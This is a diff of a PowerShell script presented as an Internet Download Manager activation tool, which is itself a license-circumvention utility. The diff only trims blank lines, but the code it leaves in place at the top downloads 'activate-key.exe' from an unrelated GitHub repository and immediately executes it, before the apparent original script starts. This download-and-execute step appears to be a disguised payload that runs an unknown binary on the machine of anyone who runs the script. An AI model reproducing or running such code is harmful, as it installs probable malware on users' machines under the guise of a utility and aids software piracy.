@@ -1,8 +1,5 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
-
-
-$rand = Get-Random -Maximum 99999999
 $url = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
 $outpath = "$PSScriptRoot/activate-key.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
@@ -10,9 +7,6 @@ $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $outpath)
 $args = @("Comma","Separated","Arguments")
 Start-Process -Filepath "$PSScriptRoot/activate-key.exe" -ArgumentList $args
-
-
-
 
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
